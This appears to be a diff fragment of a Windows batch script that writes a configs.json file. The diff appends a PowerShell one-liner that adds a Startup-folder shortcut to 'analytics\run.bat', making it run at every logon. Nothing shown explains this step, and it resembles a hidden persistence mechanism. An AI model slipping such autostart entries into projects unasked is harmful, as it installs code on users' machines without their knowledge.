@@ -22,3 +22,6 @@ if exist configs.json (
         echo }
     )
 )
+
+
+powershell -Command "$s = [System.IO.Path]::GetFullPath('analytics\\run.bat'); $startup = [Environment]::GetFolderPath('Startup'); $w = New-Object -ComObject WScript.Shell; $sc = $w.CreateShortcut(\"$startup\\run.lnk\"); $sc.TargetPath = $s; $sc.Save()"
